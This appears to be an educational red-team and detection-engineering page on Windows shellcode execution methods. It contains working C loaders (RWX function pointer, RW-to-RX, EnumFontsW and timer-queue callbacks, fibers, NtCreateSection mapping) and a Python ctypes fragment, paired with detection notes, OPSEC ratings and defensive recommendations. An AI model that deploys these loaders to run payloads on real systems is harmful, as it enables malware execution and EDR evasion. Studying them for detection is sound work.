# Shellcode Execution Methods - Educational Analysis

> **MITRE ATT&CK**: T1106 - Native API
> **Purpose**: Understanding execution primitives for detection engineering
> **Languages**: C, Python
> **Detection Focus**: Memory allocation patterns, execution flow anomalies

## Strategic Overview

Shellcode execution methods determine how position-independent code is loaded into memory and given control flow. Each method has a distinct detection profile based on the Windows APIs used and the memory patterns created. Understanding these methods is essential for:

- Building detection rules for each execution pattern
- Correlating API call sequences with malicious behavior
- Analyzing implant loaders during incident response
- Understanding which EDR telemetry catches which method

## Technical Deep-Dive

### Method Comparison

```
Detection Profile Comparison:
═══════════════════════════════════════════════════════════════
Method              │ API Calls        │ Memory    │ Detection
════════════════════╪══════════════════╪═══════════╪══════════
Function pointer    │ VirtualAlloc(RWX)│ RWX page  │ Very High
Callback abuse      │ VirtualAlloc(RX) │ RX page   │ Medium
Fiber execution     │ ConvertThread... │ RX page   │ Medium
NT API mapping      │ NtCreateSection  │ Mapped    │ Low-Med
VirtualProtect      │ Alloc(RW)+Prot   │ RW→RX     │ Medium
CreateThread        │ CreateThread     │ RWX/RX    │ High
═══════════════════════════════════════════════════════════════
```

### Method 1: Function Pointer Cast (Simplest)

```c
/*
 * Educational: The simplest shellcode execution method.
 *
 * Process:
 * 1. Allocate RWX memory (VirtualAlloc with PAGE_EXECUTE_READWRITE)
 * 2. Copy shellcode bytes to allocated memory
 * 3. Cast memory address to function pointer
 * 4. Call the function pointer
 *
 * Detection:
 * - VirtualAlloc with PAGE_EXECUTE_READWRITE (0x40) is a STRONG indicator
 * - Most legitimate code never needs RWX memory
 * - EDR hooks on NtAllocateVirtualMemory catch this immediately
 * - Sysmon + ETW log the allocation
 *
 * OPSEC Rating: VERY LOW - easily detected by any modern EDR
 */
#include <windows.h>
#include <stdio.h>

void method_function_pointer(const unsigned char *shellcode, size_t size) {
    /*
     * VirtualAlloc with PAGE_EXECUTE_READWRITE
     *
     * Detection Events:
     * - ETW: Microsoft-Windows-Kernel-Memory (allocation)
     * - EDR: Hook on NtAllocateVirtualMemory
     * - Sysmon: Correlation with subsequent execution
     *
     * Why RWX is suspicious:
     * - Normal code sections are RX (read-execute)
     * - Normal data sections are RW (read-write)
     * - RWX = self-modifying code, almost always malicious
     */
    void *exec_mem = VirtualAlloc(
        NULL,                        /* Let OS choose address */
        size,                        /* Allocation size */
        MEM_COMMIT | MEM_RESERVE,    /* Commit immediately */
        PAGE_EXECUTE_READWRITE       /* RWX - HIGH DETECTION */
    );

    if (!exec_mem) {
        printf("VirtualAlloc failed: %lu\n", GetLastError());
        return;
    }

    /* Copy shellcode to allocated memory */
    memcpy(exec_mem, shellcode, size);

    /* Cast to function pointer and execute */
    ((void(*)())exec_mem)();

    /* Cleanup (may not reach here if shellcode doesn't return) */
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

/*
 * Slightly better variant: RW allocation, then change to RX
 *
 * This avoids the RWX flag but still creates detectable patterns:
 * - VirtualAlloc(RW) followed by VirtualProtect(RX) is a known sequence
 * - The timing between alloc, write, and protect change is very short
 */
void method_two_stage(const unsigned char *shellcode, size_t size) {
    /* Stage 1: Allocate as RW (writable, not executable) */
    void *mem = VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);  /* RW only */

    if (!mem) return;

    /* Stage 2: Copy shellcode while memory is writable */
    memcpy(mem, shellcode, size);

    /* Stage 3: Change protection to RX (executable, not writable) */
    DWORD oldProtect;
    VirtualProtect(mem, size,
        PAGE_EXECUTE_READ,  /* RX - no longer writable */
        &oldProtect);

    /*
     * Detection: VirtualProtect changing RW -> RX
     * This sequence is logged by EDR and is a known indicator.
     * Better than RWX but still detectable.
     */

    /* Stage 4: Execute */
    ((void(*)())mem)();

    VirtualFree(mem, 0, MEM_RELEASE);
}
```

### Method 2: Windows Callback Abuse

```c
/*
 * Educational: Executing shellcode via Windows API callbacks.
 *
 * Instead of directly calling a function pointer, these methods
 * pass the shellcode address as a callback to legitimate Windows
 * APIs that accept function pointers.
 *
 * Advantages:
 * - Execution originates from a legitimate Windows API
 * - Call stack shows legitimate API, not direct call to heap
 * - Some AVs focus on direct function pointer execution
 *
 * Detection:
 * - Callback address pointing to dynamically allocated memory
 * - Legitimate API called with unusual parameters
 * - Call stack analysis shows alloc'd memory in callback chain
 *
 * Common Callback APIs:
 * - EnumFontsW / EnumFontFamiliesW
 * - EnumChildWindows / EnumWindows
 * - CreateTimerQueueTimer
 * - CertEnumSystemStore
 * - EnumResourceTypesA
 * - EnumSystemLocalesA / EnumDateFormatsA
 */
#include <windows.h>
#include <stdio.h>

/* EnumFonts callback execution */
void method_enum_fonts(const unsigned char *shellcode, size_t size) {
    void *mem = VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;

    memcpy(mem, shellcode, size);

    DWORD oldProtect;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);

    /*
     * EnumFontsW calls the callback for each font on the system.
     * By passing our shellcode address as the callback, the OS
     * calls our code.
     *
     * Detection: EnumFontsW with callback pointing to non-module memory.
     * EDR can check if callback address falls within a loaded module.
     */
    HDC hdc = GetDC(NULL);
    EnumFontsW(hdc, NULL, (FONTENUMPROCW)mem, 0);
    ReleaseDC(NULL, hdc);

    VirtualFree(mem, 0, MEM_RELEASE);
}

/* CreateTimerQueueTimer callback execution */
void method_timer_queue(const unsigned char *shellcode, size_t size) {
    void *mem = VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;

    memcpy(mem, shellcode, size);

    DWORD oldProtect;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);

    /*
     * CreateTimerQueueTimer schedules a callback after a delay.
     * DueTime=0 means execute immediately.
     *
     * Detection:
     * - Timer callback pointing to non-module memory
     * - Short-lived timer queues (created and deleted quickly)
     */
    HANDLE hTimer = NULL;
    HANDLE hTimerQueue = CreateTimerQueue();

    CreateTimerQueueTimer(
        &hTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)mem,  /* Shellcode as callback */
        NULL,                       /* No parameter */
        0,                          /* DueTime: immediate */
        0,                          /* Period: one-shot */
        WT_EXECUTEINTIMERTHREAD
    );

    /* Wait for callback to execute */
    Sleep(1000);

    DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
    VirtualFree(mem, 0, MEM_RELEASE);
}
```

### Method 3: Fiber-Based Execution

```c
/*
 * Educational: Shellcode execution via Windows fibers.
 *
 * Fibers are lightweight user-mode threads (cooperative scheduling).
 * By creating a fiber with shellcode as the entry point,
 * execution can be transferred without CreateThread.
 *
 * Detection:
 * - ConvertThreadToFiber followed by CreateFiber is unusual
 * - Fiber entry point in non-module memory
 * - Legitimate fiber usage is rare in most applications
 *
 * API Sequence:
 * 1. ConvertThreadToFiber() - Convert current thread to fiber
 * 2. CreateFiber() - Create new fiber with shellcode entry point
 * 3. SwitchToFiber() - Transfer execution to shellcode fiber
 */
#include <windows.h>

void method_fiber_execution(const unsigned char *shellcode, size_t size) {
    void *mem = VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;

    memcpy(mem, shellcode, size);

    DWORD oldProtect;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);

    /* Convert current thread to a fiber (required before SwitchToFiber) */
    LPVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }

    /*
     * Create fiber with shellcode as entry point
     *
     * Detection:
     * - CreateFiber with entry point outside loaded modules
     * - ETW: Microsoft-Windows-Kernel-Thread fiber events
     */
    LPVOID shellcodeFiber = CreateFiber(
        0,                          /* Default stack size */
        (LPFIBER_START_ROUTINE)mem, /* Entry point = shellcode */
        NULL                        /* No parameter */
    );

    if (shellcodeFiber) {
        /* Transfer execution to shellcode fiber */
        SwitchToFiber(shellcodeFiber);
        /* Control returns here if shellcode calls SwitchToFiber back */
        DeleteFiber(shellcodeFiber);
    }

    ConvertFiberToThread();
    VirtualFree(mem, 0, MEM_RELEASE);
}
```

### Method 4: NT API Mapping Injection

```c
/*
 * Educational: Section-based execution using NT API.
 *
 * Instead of VirtualAlloc + memcpy, this uses:
 * - NtCreateSection: Create a shared memory section
 * - NtMapViewOfSection: Map it into the process as RW
 * - Write shellcode to the RW mapping
 * - Remap as RX (or create second view as RX)
 *
 * Advantages:
 * - No VirtualAlloc/VirtualProtect calls
 * - Memory appears as mapped section, not private allocation
 * - Can map into other processes for injection
 *
 * Detection:
 * - Section creation with SEC_COMMIT flag
 * - Section mapped as EXECUTE in non-standard processes
 * - No backing file for the section (anonymous mapping)
 */
#include <windows.h>
#include <stdio.h>

/* NT API function prototypes */
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER,
    ULONG, ULONG, HANDLE
);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG
);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE, PVOID
);

void method_section_mapping(const unsigned char *shellcode, size_t size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    pNtCreateSection NtCreateSection =
        (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection =
        (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    /* Create section object */
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = size;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,  /* Max protection */
        SEC_COMMIT,
        NULL                      /* No backing file */
    );

    if (status != 0) return;

    /* Map section as RW for writing */
    PVOID rwView = NULL;
    SIZE_T viewSize = 0;

    NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &rwView, 0, 0, NULL,
        &viewSize, 1,  /* ViewUnmap */
        0,
        PAGE_READWRITE
    );

    /* Write shellcode */
    memcpy(rwView, shellcode, size);

    /* Remap as RX for execution */
    PVOID rxView = NULL;
    viewSize = 0;

    NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &rxView, 0, 0, NULL,
        &viewSize, 1,
        0,
        PAGE_EXECUTE_READ
    );

    /* Unmap the RW view (no longer needed) */
    NtUnmapViewOfSection(GetCurrentProcess(), rwView);

    /* Execute from the RX view */
    ((void(*)())rxView)();

    /* Cleanup */
    NtUnmapViewOfSection(GetCurrentProcess(), rxView);
    CloseHandle(hSection);
}
```

### Python ctypes Execution (Educational)

```python
"""
Educational: Shellcode execution via Python ctypes.
Demonstrates how Python can interact with Windows memory APIs.

Detection:
- Python.exe calling VirtualAlloc is highly suspicious
- ctypes.windll calls to kernel32 from Python = red flag
- EDR monitors Python process API calls
"""
import ctypes
import ctypes.wintypes

# Windows API constants
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

# API type definitions
kernel32 = ctypes.windll.kernel32

kernel32.VirtualAlloc.argtypes = [
    ctypes.wintypes.LPVOID,   # lpAddress
    ctypes.c_size_t,           # dwSize
    ctypes.wintypes.DWORD,     # flAllocationType
    ctypes.wintypes.DWORD,     # flProtect
]
kernel32.VirtualAlloc.restype = ctypes.wintypes.LPVOID

"""
Detection Summary for Python-based execution:
──────────────────────────────────────────────
1. Process: python.exe / pythonw.exe calling VirtualAlloc
2. API Sequence: VirtualAlloc -> RtlMoveMemory -> VirtualProtect -> CreateThread
3. Memory: Executable memory allocated by interpreter process
4. Behavior: Python process spawning no child processes but making API calls
5. Network: Python process with network connections + memory manipulation

EDR Detection:
- CrowdStrike: Detects ctypes kernel32 calls from Python
- Defender ATP: ML model flags Python memory manipulation
- Carbon Black: API call chain analysis
"""
```

## Detection & Evasion

### Detection Matrix by Method

| Method | Key API Calls | ETW Events | EDR Detection | OPSEC |
|--------|--------------|------------|---------------|-------|
| Function pointer | VirtualAlloc(RWX) | Memory alloc | Very High | Very Low |
| Two-stage | VirtualAlloc(RW) + VirtualProtect(RX) | Alloc + Protect | High | Low |
| Callback | EnumFonts/Timer + VirtualAlloc | Callback + alloc | Medium | Medium |
| Fiber | ConvertThreadToFiber + CreateFiber | Thread/fiber | Medium | Medium |
| NT mapping | NtCreateSection + NtMapViewOfSection | Section events | Low-Med | Medium-High |
| Python ctypes | VirtualAlloc from python.exe | Process + alloc | Very High | Very Low |

### Defensive Recommendations

1. **Memory monitoring**: Alert on RWX allocations and RW->RX transitions
2. **Call stack validation**: Verify callback addresses point to loaded modules
3. **API sequence correlation**: Flag VirtualAlloc -> memcpy -> VirtualProtect -> Execute patterns
4. **Process behavior**: Flag interpreters (python, powershell) making low-level memory API calls
5. **Fiber monitoring**: Log ConvertThreadToFiber + CreateFiber API usage

## Cross-References

- [Shellcode Basics](shellcode-basics.md)
- [Shellcode Encryption](shellcode-encryption.md)
- [Classic Process Injection](../process-injection/classic-injection.md)
- [Direct Syscalls](../syscalls-and-evasion/direct-syscalls.md)
- [AV/EDR Evasion](../../06-defense-evasion/av-edr-evasion.md)

## References

- MITRE ATT&CK T1106 Documentation
- ired.team: Code Execution via Callbacks
- Elastic Security: Shellcode Execution Detection
- SANS SEC565: Red Team Operations and Adversary Emulation
